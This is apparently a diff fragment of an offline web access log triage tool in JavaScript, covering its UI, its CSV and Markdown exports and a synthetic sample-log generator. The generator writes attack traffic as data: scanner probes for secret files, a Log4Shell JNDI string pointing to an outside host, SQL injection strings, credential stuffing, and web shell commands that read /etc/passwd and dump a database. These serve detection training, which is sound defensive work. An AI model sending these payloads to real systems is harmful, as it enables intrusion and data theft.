+    const h = e.target.closest('.rs'); if (!h) return;
+    e.preventDefault(); e.stopPropagation();
+    const th = h.parentElement;
+    if (!cs.w) {
+      const w = cols.map(() => 120);
+      head.querySelectorAll('th').forEach(x => { w[+x.dataset.c] = Math.round(x.getBoundingClientRect().width); x.style.width = w[+x.dataset.c] + 'px'; });
+      cs.w = w; applyColWidths(k, head, cols);
+    }
+    rs = { c: +th.dataset.c, x: e.clientX, w: cs.w[+th.dataset.c], th };
+    h.setPointerCapture(e.pointerId); document.body.classList.add('col-resizing');
+  });
+  head.addEventListener('pointermove', e => {
+    if (!rs) return;
+    const w = Math.max(48, Math.round(rs.w + e.clientX - rs.x));
+    cs.w[rs.c] = w; rs.th.style.width = w + 'px'; applyColWidths(k, head, cols);
+  });
+  // The click that the browser fires at the end of a resize gesture must not sort; a later deliberate click must.
+  const endRs = () => { if (rs) { rs = null; justResized = true; setTimeout(() => { justResized = false; }, 0); document.body.classList.remove('col-resizing'); } };
+  head.addEventListener('pointerup', endRs); head.addEventListener('pointercancel', endRs);
+  head.addEventListener('dragstart', e => {
+    const th = e.target.closest('th');
+    if (rs || !th || e.target.closest('.rs')) { e.preventDefault(); return; }
+    dragC = +th.dataset.c; th.classList.add('dragging');
+    e.dataTransfer.effectAllowed = 'move'; e.dataTransfer.setData('text/plain', String(dragC));
+  });
+  head.addEventListener('dragover', e => {
+    const th = e.target.closest('th'); if (dragC === null || !th) return;
+    e.preventDefault(); e.dataTransfer.dropEffect = 'move';
+    const r = th.getBoundingClientRect(), after = e.clientX > r.left + r.width / 2;
+    head.querySelectorAll('th').forEach(x => x.classList.remove('drop-before', 'drop-after'));
+    if (+th.dataset.c !== dragC) th.classList.add(after ? 'drop-after' : 'drop-before');
+  });
+  head.addEventListener('drop', e => {
+    const th = e.target.closest('th'); if (dragC === null || !th) return;
+    e.preventDefault(); e.stopPropagation();
+    const to = +th.dataset.c, r = th.getBoundingClientRect(), after = e.clientX > r.left + r.width / 2, from = dragC;
+    dragC = null; clearMarks(); if (to !== from) moveCol(from, to, after);
+  });
+  head.addEventListener('dragend', () => { dragC = null; clearMarks(); });
+  head.addEventListener('click', e => {
+    if (!onActivate || e.target.closest('.rs') || justResized) return;
+    const th = e.target.closest('th'); if (th) onActivate(th);
+  });
+  head.addEventListener('keydown', e => {
+    const th = e.target.closest('th'); if (!th) return;
+    if (onActivate && !e.altKey && (e.key === 'Enter' || e.key === ' ')) { e.preventDefault(); onActivate(th); head.querySelector(`th[data-c="${th.dataset.c}"]`).focus(); return; }
+    if (!e.altKey || (e.key !== 'ArrowLeft' && e.key !== 'ArrowRight')) return;
+    e.preventDefault();
+    const order = colOrder(k, cols), c = +th.dataset.c, i = order.indexOf(c), j = e.key === 'ArrowLeft' ? i - 1 : i + 1;
+    if (j < 0 || j >= order.length) return;
+    moveCol(c, order[j], e.key === 'ArrowRight');
+    head.querySelector(`th[data-c="${c}"]`).focus();
+  });
+  $(resetId).addEventListener('click', () => { cs.order = null; cs.w = null; render(); });
+}
+function renderAll() { renderStatus(); renderChips(); drawTimeline(); renderFindings(); renderTops(); renderConversations(true); renderTable(); }
+
+/* ================= request drawer ================= */
+const PREF = ['time', 'client', 'ident', 'user', 'request', 'method', 'path', 'query', 'proto', 'status', 'bytes', 'referer', 'ua', 'vhost', 'port', 'x1', 'x2', 'x3', 'prefix'];
+const prefIdx = k => { const i = PREF.indexOf(k); return i < 0 ? 999 : i; };
+function openDrawer(o, fromSession) {
+  hideRuleTip(true);
+  state.cur = o; if (!fromSession) state.curSession = null;
+  const keys = Object.keys(o).filter(k => k[0] !== '$').sort((a, b) => prefIdx(a) - prefIdx(b) || a.localeCompare(b));
+  const hasT = isFinite(o.$t), u = urlOf(o);
+  const decoded = u ? pctDecode(pctDecode(hexDecode(u))) : '';
+  const derived = [['status class', o.$sc], ['response time', o.$rt !== undefined ? fmtMs(o.$rt) : ''], ['file type', o.$ext || ''], ['referring site', o.$refhost || ''],
+    ['query parameters', o.$qkeys ? o.$qkeys.join(', ') : ''], ['decoded URL', decoded !== u ? decoded : ''], ['format', o.$fmt]].filter(x => x[1]);
+  $('drawer').classList.remove('wide');
+  $('drawer').innerHTML = `<header><h2>Request details</h2><button class="btn small" type="button" data-act="close">Close</button></header>
+    <p class="meta"><span class="sc sc-${esc(o.$sc)}">${esc(o.status)}</span> <span class="muted">${esc(fmtTime(o.$t))} (${esc(tzLabel())}), from ${esc(o.$file || '')}</span></p>
+    ${o.$rules ? `<p class="rulehits">${o.$rules.map(r => ruleChip(r)).join('')}</p><p class="hint rh-hint">Hover over or tab to a match to see what triggered it and how to judge it.</p>` : ''}
+    <div class="dacts">
+      ${fromSession ? '<button class="btn small" type="button" data-act="back">Back to conversation</button>' : ''}
+      <button class="btn small" type="button" data-act="conv" ${hasT ? '' : 'disabled'}>Open its conversation</button>
+      <button class="btn small" type="button" data-act="around" ${hasT ? '' : 'disabled'}>Same client, 15 minutes either side</button>
+      <button class="btn small" type="button" data-act="copy">Copy raw line</button>
+    </div>
+    <p class="hint" style="margin-bottom:8px">Click a value to filter to it. Shift-click to exclude it.</p>
+    <table class="kv">${keys.map(k => `<tr><th>${esc(k)}</th><td><button type="button" data-k="${escA(k)}" data-v="${escA(o[k])}">${esc(o[k] === '' ? '(empty)' : o[k])}</button></td></tr>`).join('')}
+      ${derived.map(([k, v]) => `<tr><th>${esc(k)}</th><td><span class="dv">${esc(v)}</span></td></tr>`).join('')}</table>
+    <pre>${esc(o.$raw)}</pre>`;
+  $('drawer').hidden = false;
+  $('drawer').querySelector('[data-act="close"]').focus();
+}
+function closeDrawer() {
+  hideRuleTip(true); $('drawer').hidden = true; state.cur = null; state.curSession = null; }
+async function copyText(t) {
+  try { await navigator.clipboard.writeText(t); return true; }
+  catch { const ta = document.createElement('textarea'); ta.value = t; document.body.appendChild(ta); ta.select(); let ok = false; try { ok = document.execCommand('copy'); } catch {} ta.remove(); return ok; }
+}
+
+/* ================= exports ================= */
+function csvCell(v) {
+  if (v == null) return '';
+  let s = String(v);
+  if (/^[=+\-@\t\r]/.test(s) && isNaN(Number(s))) s = "'" + s;   // log fields are attacker-controlled: neutralise formulas
+  return /[",\n\r]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
+}
+function stampName() { const d = new Date(); return `${d.getFullYear()}${pad(d.getMonth() + 1)}${pad(d.getDate())}-${pad(d.getHours())}${pad(d.getMinutes())}`; }
+function download(name, parts, type) {
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob(parts, { type })); a.download = name;
+  document.body.appendChild(a); a.click();
+  setTimeout(() => { URL.revokeObjectURL(a.href); a.remove(); }, 2000);
+}
+function exportCsv() {
+  const F = state.F; if (!F.length) return;
+  const freq = new Map();
+  for (let i = 0; i < F.length; i++) for (const k in F[i]) if (k.charCodeAt(0) !== 36) freq.set(k, (freq.get(k) || 0) + 1);
+  const keys = [...freq.keys()].sort((a, b) => prefIdx(a) - prefIdx(b) || freq.get(b) - freq.get(a) || a.localeCompare(b));
+  const out = [['time_utc', 'status_class', 'response_time_ms', 'patterns', ...keys].join(',') + '\n']; let buf = [];
+  for (let i = 0; i < F.length; i++) {
+    const o = F[i];
+    buf.push([isFinite(o.$t) ? new Date(o.$t).toISOString() : '', o.$sc, o.$rt !== undefined ? o.$rt.toFixed(3) : '', o.$rules ? o.$rules.join(' ') : '', ...keys.map(k => csvCell(o[k]))].join(','));
+    if (buf.length >= 5000) { out.push(buf.join('\n') + '\n'); buf = []; }
+  }
+  if (buf.length) out.push(buf.join('\n') + '\n');
+  download(`web-requests-${stampName()}.csv`, out, 'text/csv');
+}
+const defang = s => s.replace(/\b(https?|ftp)(:\/\/)/gi, (m, sch) => sch.replace(/t/gi, 'x') + '[://]').replace(/\bwww\./gi, 'www[.]');
+const mdc = v => defang(vis(v)).replace(/[\r\n]+/g, ' ').replace(/[\\`*_{}\[\]<>|~!#]/g, '\\$&');
+const mdcode = v => '`' + vis(v).replace(/[\r\n]+/g, ' ').replace(/`/g, "'").replace(/\|/g, '\\|') + '`';
+function buildSummary() {
+  const F = state.F, now = new Date(), md = [];
+  let lo = NaN, hi = NaN;
+  for (let i = 0; i < F.length; i++) if (isFinite(F[i].$t)) { lo = F[i].$t; break; }
+  for (let i = F.length - 1; i >= 0; i--) if (isFinite(F[i].$t)) { hi = F[i].$t; break; }
+  const iso = t => isFinite(t) ? new Date(t).toISOString().replace('.000Z', 'Z') : 'n/a';
+  md.push('# Web access log triage: case summary', '');
+  md.push(`Generated ${fmtTime(now.getTime())} (${tzLabel()}), ${iso(now.getTime())}. Produced offline by web-log-triage.html version ${TOOL_VERSION}, script SHA-256 ${TOOL_FP}.`, '');
+  md.push('Leads, pattern matches and "inferred" notes are heuristics generated by the tool. Treat them as questions to verify against the logs, not as findings.', '');
+  md.push('Values copied from the logs are treated as untrusted: URLs are defanged (hxxps[://]) and hidden characters are shown as ⟦U+XXXX⟧.', '');
+  md.push('## Evidence files', '', '| File | Size (bytes) | SHA-256 | Formats detected | Requests | Unrecognised lines |', '|---|---:|---|---|---:|---:|');
+  state.files.forEach((f, i) => {
+    const c = Object.entries(state.fileFmts[i] || {}), ev = c.reduce((a, [, n]) => a + n, 0);
+    md.push(`| ${mdc(f)} | ${state.fileSize[i]} | ${mdcode(state.fileHash[i] || 'not computed')} | ${mdc(c.map(([k]) => k).join('; ') || 'none')} | ${ev} | ${state.fileSkipped[i] || 0} |`);
+  });
+  md.push('', 'SHA-256 is computed over the file bytes exactly as loaded (compressed bytes for .gz). Compare against hashes from the provider to confirm the files were not altered in transit.', '');
+  md.push('## Scope of this summary', '');
+  md.push(`- Requests loaded: ${fmtN(state.events.length)}`);
+  md.push(`- Requests covered by this summary: ${fmtN(F.length)}${F.length === state.events.length ? ' (no filters applied)' : ''}`);
+  md.push(`- Detected time range: ${isFinite(lo) ? `${iso(lo)} to ${iso(hi)} (UTC); ${fmtTime(lo)} to ${fmtTime(hi)} (${tzLabel()})` : 'no timestamped requests'}`);
+  md.push(`- Filters applied: ${state.tokens.length ? state.tokens.map(mdcode).join(' ') : 'none'}`);
+  md.push(`- Time selection: ${state.range ? `${iso(state.range[0])} to ${iso(state.range[1])} (UTC)` : 'none'}`);
+  md.push(`- Extra fields: ${state.extras.length ? state.extras.map(e => `${e.name} on ${fmtN(e.n)} lines`).join(', ') + `. Response time: ${rtDesc()} (${state.rtField === 'auto' || state.rtMode === 'auto' ? 'automatic choice from the values, not confirmed against the server configuration' : 'set by the analyst'})` : 'none'}`);
+  md.push(`- Conversation boundary: a new conversation starts after ${state.sessGap} minutes idle (same client, user agent and site)`);
+  md.push(`- Unloaded from this session: ${state.unloaded.length ? state.unloaded.map(u => `${mdc(u.name)} (${u.sid}, ${fmtN(u.n)} requests, ${mdc(u.files)})`).join('; ') : 'none'}`, '');
+  md.push('## Data quality', '');
+  const w = getWarnings();
+  md.push(...(w.length ? w.map(x => `- ${mdc(x)}`) : ['- No parser warnings.']), '');
+  md.push('## Sites', '', '| Id | Site | Requests | Clients | Time span (UTC) | Source files |', '|---|---|---:|---:|---|---|');
+  for (const d of state.sites) md.push(`| ${d.sid} | ${mdc(state.labels.has(d.sid) ? `${state.labels.get(d.sid)} (renamed; name in logs: ${SRC.original(d)})` : SRC.original(d))} | ${d.n} | ${d.clients.size} | ${iso(d.lo)} to ${iso(d.hi)} | ${mdc([...d.files].map(i => state.files[i]).join(', '))} |`);
+  const noted = state.sites.filter(d => d.notes.length);
+  if (noted.length) { md.push(''); for (const d of noted) for (const n of d.notes) md.push(`- ${d.sid} ${mdc(labelOf(d.sid, d.vhost !== undefined ? d.vhost : d.file))}, inferred: ${mdc(n)}`); }
+  md.push('', '## Leads in this selection', '');
+  const L = computeLeads(F);
+  if (!L.length) md.push('No leads from the built-in checks. These checks are narrow, so no lead is not the same as no problem.', '');
+  for (const l of L) {
+    md.push(`### ${mdc(l.title)} (${l.level === 'first' ? 'look first' : 'review'})`, '', `_${mdc(l.why)}_`, '');
+    for (const r of l.rows) md.push(`- ${mdcode(r.k)}: ${mdc(r.d)}`);
+    md.push('');
+  }
+  const conv = sortSessions(buildSessions(F, state.sessGap), 'n', -1);
+  md.push('## Top conversations', '', conv.length ? `Top ${Math.min(15, conv.length)} of ${fmtN(conv.length)} conversations by request count. The full list is available as a CSV export from the tool.` : 'No timestamped requests in this selection.', '');
+  if (conv.length) {
+    md.push('| Start (UTC) | Duration | Client | User agent | Requests | Paths | 4xx | 5xx | Pattern hits | Bytes |', '|---|---|---|---|---:|---:|---:|---:|---:|---:|');
+    for (const s of conv.slice(0, 15)) md.push(`| ${iso(s.first)} | ${fmtDur(s.last - s.first)} | ${mdc(s.client)} | ${mdc(s.ua)} | ${s.n} | ${s.paths.size} | ${s.sc['4xx']} | ${s.sc['5xx']} | ${s.rules} | ${mdc(fmtBytes(s.bytes))} |`);
+    md.push('');
+  }
+  md.push('## Analyst notes', '', '_Conclusions, verification steps taken, and open questions._', '');
+  return md.join('\n');
+}
+function exportSummary() { if (state.events.length) download(`web-case-summary-${stampName()}.md`, [buildSummary()], 'text/markdown'); }
+
+/* ================= sample data ================= */
+function makeSample() {
+  let seed = 4242;
+  const R = () => { seed |= 0; seed = seed + 0x6D2B79F5 | 0; let t = Math.imul(seed ^ seed >>> 15, 1 | seed); t = t + Math.imul(t ^ t >>> 7, 61 | t) ^ t; return ((t ^ t >>> 14) >>> 0) / 4294967296; };
+  const pick = a => a[Math.floor(R() * a.length)], ri = (a, b) => a + Math.floor(R() * (b - a + 1));
+  const MON = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'], TZ = 13 * 36e5;
+  const ts = ms => { const d = new Date(ms + TZ); return `${pad(d.getUTCDate())}/${MON[d.getUTCMonth()]}/${d.getUTCFullYear()}:${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())} +1300`; };
+  const out = [], end = Math.floor(Date.now() / 6e4) * 6e4, start = end - 3 * 864e5;
+  const line = (ms, ip, req, st, bytes, us, ref, ua) => out.push([ms, `${ip} - - [${ts(ms)}] "${req}" ${st} ${bytes} ${us} "${ref}" "${ua}"`]);
+  const BROWSERS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1'];
+  const SITE = 'https://portal.example';
+  const PAGES = ['/', '/timetables', '/timetables/route-12', '/live/index.html', '/about', '/contact', '/news', '/fares'];
+  const ASSETS = ['/static/app.js', '/static/style.css', '/images/logo.png', '/static/vendor.js', '/favicon.ico'];
+  const SERVICES = Array.from({ length: 40 }, (_, i) => 2300 + i * 7);
+  const day = ms => { const d = new Date(ms + TZ); return `${d.getUTCFullYear()}-${pad(d.getUTCMonth() + 1)}-${pad(d.getUTCDate())}`; };
+  // integration polling (the expected traffic)
+  for (let t = start; t < end; t += 30000) {
+    const ip = pick(['203.0.113.11', '203.0.113.12', '203.0.113.13']);
+    line(t + ri(0, 2000), ip, `GET /live/api/routeinfo.p?Service=${pick(SERVICES)}&Date=${day(t)} HTTP/1.1`, 200, ri(15000, 24000), ri(40000, 110000), '-', 'IntegrationClient/2.4');
+  }
+  // browser visits
+  for (let v = 0; v < 900; v++) {
+    const ip = `192.0.2.${ri(10, 240)}`, ua = pick(BROWSERS); let t = start + Math.floor(R() * (end - start - 36e5)), ref = pick(['-', 'https://www.google.com/', 'https://www.bing.com/']);
+    for (let p = 0; p < ri(1, 6); p++) {
+      const page = pick(PAGES);
+      line(t, ip, `GET ${page} HTTP/1.1`, 200, ri(8000, 60000), ri(5000, 60000), ref, ua);
+      for (const a of ASSETS) if (R() < 0.6) { const nm = R() < 0.5; line(t + ri(50, 900), ip, `GET ${a} HTTP/1.1`, nm ? 304 : 200, nm ? 0 : ri(2000, 300000), ri(400, 8000), SITE + page, ua); }
+      ref = SITE + page; t += ri(5000, 120000);
+    }
+  }
+  // search engine crawler
+  for (let i = 0; i < 300; i++) line(start + Math.floor(R() * (end - start)), '198.51.100.66', `GET ${pick(PAGES.concat(['/timetables/route-' + ri(1, 80)]))} HTTP/1.1`, R() < 0.9 ? 200 : 404, ri(5000, 50000), ri(5000, 40000), '-', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
+  // idle connections and a few honest 404s
+  for (let i = 0; i < 60; i++) line(start + Math.floor(R() * (end - start)), `192.0.2.${ri(10, 240)}`, '-', 408, 0, ri(20000000, 30000000), '-', '-');
+  // 1. scraper enumerating Service IDs
+  let t = end - 60 * 36e5;
+  for (let s = 1; s <= 1500; s++) line(t + s * 900, '198.51.100.77', `GET /live/api/routeinfo.p?Service=${s}&Date=${day(t)} HTTP/1.1`, 200, SERVICES.includes(s) ? ri(15000, 24000) : 412, ri(30000, 90000), '-', 'python-requests/2.32.3');
+  // 2. vulnerability scanner
+  t = end - 48 * 36e5;
+  const probes = ['/.env', '/.git/config', '/wp-login.php', '/xmlrpc.php', '/phpmyadmin/', '/administrator/', '/server-status', '/backup.sql', '/config.php', '/web.config',
+    '/actuator/env', '/cgi-bin/luci', '/.aws/credentials', '/wp-admin/install.php', '/manager/html', '/solr/admin', '/id_rsa', '/db.sqlite', '/phpinfo.php', '/.DS_Store'];
+  for (let i = 0; i < 260; i++) {
+    const p = i < probes.length ? probes[i] : `/${pick(['admin', 'old', 'test', 'dev', 'api', 'v1', 'backup', 'tmp', 'private', 'install'])}${pick(['', '.php', '.bak', '.zip', '/'])}${i}`;
+    line(t + i * 700, '203.0.113.200', `GET ${p} HTTP/1.1`, p === '/server-status' ? 403 : 404, 196, ri(300, 2000), '-', 'Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))');
+  }
+  line(t + 200 * 700, '203.0.113.200', 'GET /index.php?page=../../../../etc/passwd HTTP/1.1', 404, 196, 900, '-', 'Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))');
+  line(t + 201 * 700, '203.0.113.200', 'GET /?q=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1', 200, 18211, 30000, '-', 'Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))');
+  line(t + 202 * 700, '203.0.113.200', 'GET /?x=${jndi:ldap://203.0.113.200:1389/a} HTTP/1.1', 200, 18211, 28000, '-', 'Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))');
+  line(t + 203 * 700, '203.0.113.201', '\\x16\\x03\\x01\\x00\\xa5\\x01\\x00\\x00\\xa1\\x03\\x03', 400, 226, 120, '-', '-');
+  line(t + 204 * 700, '203.0.113.201', 'CONNECT www.example.com:443 HTTP/1.1', 405, 230, 200, '-', '-');
+  line(t + 205 * 700, '203.0.113.201', 'GET http://www.example.com/ HTTP/1.1', 400, 226, 150, '-', '-');
+  line(t + 206 * 700, '203.0.113.201', 'TRACE / HTTP/1.1', 405, 230, 140, '-', '-');
+  // 3. sqlmap against the API, time-based
+  t = end - 30 * 36e5;
+  const sq = ["2308'", "2308' AND 1=1-- -", "2308' AND SLEEP(5)-- -", '2308 AND 1=2', "2308' UNION SELECT NULL,NULL-- -", "2308') AND (SELECT 1 FROM (SELECT(SLEEP(5)))x)-- -", "2308' OR '1'='1"];
+  for (let i = 0; i < 140; i++) {
+    const p = sq[i % sq.length], slow = /SLEEP/.test(p) && i % 3 === 0;
+    line(t + i * 4000, '192.0.2.250', `GET /live/api/routeinfo.p?Service=${encodeURIComponent(p)}&Date=${day(t)} HTTP/1.1`, slow ? 200 : (i % 4 === 0 ? 500 : 200), slow ? 15200 : ri(300, 900), slow ? ri(5000000, 5200000) : ri(30000, 90000), '-', 'sqlmap/1.8.4#stable (https://sqlmap.org)');
+  }
+  // 4. credential stuffing on the login form, ending in success
+  t = end - 20 * 36e5;
+  for (let i = 0; i < 64; i++) line(t + i * 6000, '198.51.100.140', 'POST /login HTTP/1.1', 401, 512, ri(80000, 200000), SITE + '/login', BROWSERS[0]);
+  line(t + 64 * 6000, '198.51.100.140', 'POST /login HTTP/1.1', 302, 0, 150000, SITE + '/login', BROWSERS[0]);
+  line(t + 64 * 6000 + 900, '198.51.100.140', 'GET /account HTTP/1.1', 200, 24311, 60000, SITE + '/login', BROWSERS[0]);
+  line(t + 64 * 6000 + 9000, '198.51.100.140', 'GET /account/export?format=csv HTTP/1.1', 200, 2811004, 900000, SITE + '/account', BROWSERS[0]);
+  // 5. upload, web shell, then data out
+  t = end - 10 * 36e5;
+  const W = '198.51.100.23', WUA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+  line(t, W, 'GET /upload.php HTTP/1.1', 200, 3110, 20000, '-', WUA);
+  line(t + 4000, W, 'POST /upload.php HTTP/1.1', 200, 488, 300000, SITE + '/upload.php', WUA);
+  const cmds = ['whoami', 'id', 'uname%20-a', 'cat%20/etc/passwd', 'ls%20-la%20/var/www', 'cat%20/var/www/config.php', 'mysqldump%20-u%20app%20portal%20%3E%20/var/www/uploads/db_dump.sql'];
+  cmds.forEach((c, i) => line(t + 60000 + i * 20000, W, `GET /uploads/img_7731.php?cmd=${c} HTTP/1.1`, 200, ri(40, 4000), ri(20000, 900000), '-', WUA));
+  line(t + 260000, W, 'GET /uploads/db_dump.sql HTTP/1.1', 200, 487337112, 41000000, '-', WUA);
+  out.sort((a, b) => a[0] - b[0]);
+  return out.map(x => x[1]).join('\n') + '\n';
+}
+
+/* ================= wiring ================= */
+function resetAll() {
+  Object.assign(state, { srcIds: new Map(), srcSeq: 0, labels: new Map(), renaming: null, unloaded: [], fileUnloaded: [], events: [], files: [], fileFmts: [], fileHash: [], fileSize: [], fileSkipped: [], fileErrors: [], skipped: 0, skippedSamples: [], longLines: 0,
+    noTime: 0, noTz: 0, truncated: 0, w3c: 0, tokens: [], range: null, filterError: '', C: [], F: [], buckets: null, page: 0, cvPage: 0, sites: [], sessions: [], cvRows: [],
+    rtMode: 'auto', rtField: 'auto', rtFieldUsed: '', extras: [] });
+  $('q').value = ''; closeDrawer();
+  $('main').hidden = true; $('empty').hidden = false; $('clearBtn').hidden = true; $('summaryBtn').hidden = true; $('sites').innerHTML = '';
+}
+function numberInput(id, max, apply) {
+  const el = $(id);
+  const go = () => {
+    const raw = el.value.replace(/[,\s]/g, ''), n = Number(raw);
+    if (!/^\d+$/.test(raw) || n < 1) { el.setAttribute('aria-invalid', 'true'); return; }
+    el.removeAttribute('aria-invalid'); const v = Math.min(n, max); el.value = String(v); apply(v);
+  };
+  el.addEventListener('change', go);
+  el.addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); go(); } });
+}
+function init() {
+  $('fileInput').addEventListener('change', e => { loadFiles(e.target.files); e.target.value = ''; });
+  $('openLbl').addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); $('fileInput').click(); } });
+  $('sampleBtn').addEventListener('click', () => loadFiles([new File([makeSample()], 'sample-access.log', { type: 'text/plain' })]));
+  $('clearBtn').addEventListener('click', resetAll);
+  $('summaryBtn').addEventListener('click', exportSummary);
+  document.querySelectorAll('.seg button').forEach(b => b.addEventListener('click', () => {
+    state.tz = b.dataset.tz;
+    document.querySelectorAll('.seg button').forEach(x => x.setAttribute('aria-pressed', String(x === b)));
+    if (state.events.length) { renderSites(); applyFilters(); if (state.curSession) openConversation(state.curSession); else if (state.cur) openDrawer(state.cur); }
+  }));
+  const apply = () => { state.tokens = tokenize2($('q').value); applyFilters(); };
+  $('q').addEventListener('keydown', e => { if (e.key === 'Enter') apply(); });
+  $('q').addEventListener('search', apply);
+  $('applyBtn').addEventListener('click', apply);
+  $('helpBtn').addEventListener('click', () => { const h = $('help'); h.hidden = !h.hidden; $('helpBtn').setAttribute('aria-expanded', String(!h.hidden)); });
+  $('chips').addEventListener('click', e => {
+    const b = e.target.closest('button'); if (!b) return;
+    if (b.dataset.range) { state.range = null; applyFilters({ keepC: true }); return; }
+    state.tokens.splice(Number(b.dataset.i), 1); $('q').value = state.tokens.join(' '); applyFilters();
+  });
+  $('status').addEventListener('change', e => {
+    if (e.target.id === 'rtMode') { state.rtMode = e.target.value; applyRt(true); }
+    else if (e.target.id === 'rtField') { state.rtField = e.target.value; applyRt(true); }
+  });
+  $('rangeReset').addEventListener('click', () => { state.range = null; applyFilters({ keepC: true }); });
+  $('tops').addEventListener('click', e => { const b = e.target.closest('.trow'); if (b) addTokens([makeToken(b.dataset.f, b.dataset.v, e.shiftKey)]); });
+  $('findings').addEventListener('click', e => { const b = e.target.closest('.frow'); if (b) addTokens(JSON.parse(b.dataset.t)); });
+  setupSourceCards('sites');
+  const openRow = tr => { if (tr && tr.dataset.i) openDrawer(state.F[Number(tr.dataset.i)]); };
+  $('evBody').addEventListener('click', e => openRow(e.target.closest('tr')));
+  $('evBody').addEventListener('keydown', e => { if (e.key === 'Enter') openRow(e.target.closest('tr')); });
+  $('sortBtn').addEventListener('click', () => { state.newestFirst = !state.newestFirst; state.page = 0; renderTable(); });
+  $('prevBtn').addEventListener('click', () => { state.page--; renderTable(); $('evWrap').scrollTop = 0; });
+  $('nextBtn').addEventListener('click', () => { state.page++; renderTable(); $('evWrap').scrollTop = 0; });
+  $('exportBtn').addEventListener('click', exportCsv);
+  numberInput('pageSize', PAGE_MAX, v => { const first = state.page * state.pageSize; state.pageSize = v; state.page = Math.floor(first / v); renderTable(); $('evWrap').scrollTop = 0; });
+  numberInput('cvPageSize', PAGE_MAX, v => { const first = state.cvPage * state.cvPageSize; state.cvPageSize = v; state.cvPage = Math.floor(first / v); renderConversations(false); $('cvWrap').scrollTop = 0; });
+  $('cvPrev').addEventListener('click', () => { state.cvPage--; renderConversations(false); $('cvWrap').scrollTop = 0; });
+  $('cvNext').addEventListener('click', () => { state.cvPage++; renderConversations(false); $('cvWrap').scrollTop = 0; });
+  numberInput('cvGap', 1440, v => { state.sessGap = v; renderConversations(true); });
+  $('cvExport').addEventListener('click', exportConversations);
+  const cvSort = th => {
+    const k = CV_COLS[+th.dataset.c][0];
+    state.cvSort = state.cvSort.k === k ? { k, dir: -state.cvSort.dir } : { k, dir: ['dur', 'n', 'np', 's2', 's3', 's4', 's5', 'bytes', 'rules'].includes(k) ? -1 : 1 };
+    state.cvPage = 0; renderConversations(false);
+  };
+  const cvOpen = tr => { if (tr && tr.dataset.i !== undefined) openConversation(state.cvRows[Number(tr.dataset.i)]); };
+  $('cvBody').addEventListener('click', e => cvOpen(e.target.closest('tr')));
+  $('cvBody').addEventListener('keydown', e => { if (e.key === 'Enter') cvOpen(e.target.closest('tr')); });
+  $('drawer').addEventListener('click', async e => {
+    const tr = e.target.closest('table.tr tbody tr');
+    if (tr && state.curSession) { const s = state.curSession; openDrawer(s.ev[Number(tr.dataset.i)], true); state.curSession = s; return; }
+    const b = e.target.closest('button'); if (!b) return;
+    const act = b.dataset.act;
+    if (act === 'close') { closeDrawer(); return; }
+    if (act === 'cvfilter' && state.curSession) { const s = state.curSession; state.tokens = sessionTokens(s); $('q').value = state.tokens.join(' '); state.range = [s.first, s.last + 1000]; applyFilters(); return; }
+    if (act === 'cvclient' && state.curSession) { const s = state.curSession; state.tokens = [makeToken('ip', s.client)]; $('q').value = state.tokens.join(' '); state.range = null; applyFilters(); return; }
+    if (act === 'back' && state.curSession) { openConversation(state.curSession); return; }
+    const o = state.cur; if (!o) return;
+    if (b.dataset.k) { addTokens([makeToken(b.dataset.k, b.dataset.v, e.shiftKey)]); return; }
+    if (act === 'conv') { const s = findSessionFor(o); if (s) openConversation(s); }
+    else if (act === 'around') { state.tokens = [makeToken('ip', o.client)]; $('q').value = state.tokens.join(' '); state.range = [o.$t - 9e5, o.$t + 9e5]; applyFilters(); }
+    else if (act === 'copy') { const ok = await copyText(o.$raw); b.textContent = ok ? 'Copied' : 'Copy failed: select the line below'; setTimeout(() => { b.textContent = 'Copy raw line'; }, 1600); }
+  });
+  document.addEventListener('keydown', e => {
+    if (e.key !== 'Escape') return;
+    if (!$('floatTip').hidden) { hideRuleTip(true); return; }      // first Esc closes the explainer only
+    if (!$('drawer').hidden && !$('about').open) closeDrawer();
+  });
+  setupRuleTips();
+  let depth = 0;
+  const hasFiles = e => e.dataTransfer && [...e.dataTransfer.types].includes('Files');
+  window.addEventListener('dragenter', e => { if (!hasFiles(e)) return; e.preventDefault(); depth++; $('dropOverlay').hidden = false; });
+  window.addEventListener('dragover', e => { if (hasFiles(e)) e.preventDefault(); });
+  window.addEventListener('dragleave', () => { depth = Math.max(0, depth - 1); if (!depth) $('dropOverlay').hidden = true; });
+  window.addEventListener('drop', e => { e.preventDefault(); depth = 0; $('dropOverlay').hidden = true; if (e.dataTransfer.files.length) loadFiles(e.dataTransfer.files); });
+  setupTimeline();
+  setupColumns('ev', 'evHead', COLS, renderTable, 'colReset');
+  setupColumns('cv', 'cvHead', CV_COLS, () => renderConversations(false), 'cvColReset', cvSort);
+  let rt; window.addEventListener('resize', () => { clearTimeout(rt); rt = setTimeout(drawTimeline, 120); });
+  // about dialog
